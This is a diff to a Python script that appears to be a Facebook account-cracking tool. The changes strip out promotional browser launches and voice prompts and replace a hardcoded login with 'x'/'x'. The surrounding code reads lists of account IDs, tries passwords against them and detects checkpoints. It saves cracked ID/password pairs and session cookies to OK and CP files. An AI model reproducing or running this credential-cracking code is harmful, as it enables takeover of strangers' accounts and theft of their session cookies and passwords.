@@ -219,7 +219,6 @@ def linex():
     print('\033[1;37m')
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-os.system('xdg-open https://www.facebook.com/ashik.khan444?mibextid=b06tZ0')
 logo =(f"""
 \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
 \033[1;91m[\033[1;92m੯ूᵕ̤ू U॒॒॒॒॒୭ℒℴѵℯ❤\033[1;91m]\033[1;92m \x1b[38;5;46m╔═══╗╔═══╗╔═══╗╔╗───╔═══╗ \033[1;91m|
@@ -285,9 +284,7 @@ meyexudi()
 def naima():
 	print('-------------------')
 print(logo)
-os.system('espeak -a 300 " Your,   Real,  Name,"')
 uname =input('\033[1;91m[\033[1;92m√\033[1;91m] \x1b[38;5;50mENTER YOUR NAME \033[1;91m: \33[1;32m')
-os.system('espeak -a 300 " Welcome,   to,  ASHIK,  V I P,  Tools"')
 def back():
 	login()
 	
@@ -299,7 +296,7 @@ while attemps < 12345677901:
     username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
     password = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER PASSWORD: ')
 
-    if username == 'Tamim' and password == '420':
+    if username == 'x' and password == 'x':
         print(' \033[0;92mYou Have Successfully Logged in.')
         break
     else:
@@ -376,7 +373,6 @@ def menu():
     elif ASHIK in ['1']:
         crack_file()
     elif ASHIK in ['2','02']:
-        os.system('xdg-open https://github.com/RX-ASHIK')
         os.system("python nono.py")
     elif ASHIK in ['3','03']:
         result()
@@ -566,7 +562,6 @@ def dump_massal():
  
 def crack_file():
     print('\x1b[38;5;50m==================')
-    os.system('espeak -a 300 " your file name"')
     print('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mPUT FILE NAME EXAMPLE: /sdcard/file.txt Etc.]')
     o = input('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mINTER YOUR FILE NAME :\x1b[1;95m ')
     try:lin = open(o).read().splitlines()
@@ -741,7 +736,6 @@ def crack(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[10;92m\033[1;91m[\033[1;92mASHIK-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                 print('\x1b[38;5;50m===============================================')
-                os.system('espeak -a 300 " CP, ID"')
                 open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 CP+=1
@@ -752,7 +746,6 @@ def crack(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[10;92m\033[1;91m[\033[1;92mASHIK-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                 print('\x1b[38;5;50m===============================================')
-                os.system('espeak -a 300 " ASHIK,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
@@ -785,7 +778,6 @@ def crackfree(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[10;92m\033[1;91m[\033[1;92mASHIK-CP\033[1;91m] {idf} • {pw}')
                 print('\x1b[38;5;50m============================')
-                os.system('espeak -a 300 " CP, ID"')
                 open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 CP+=1
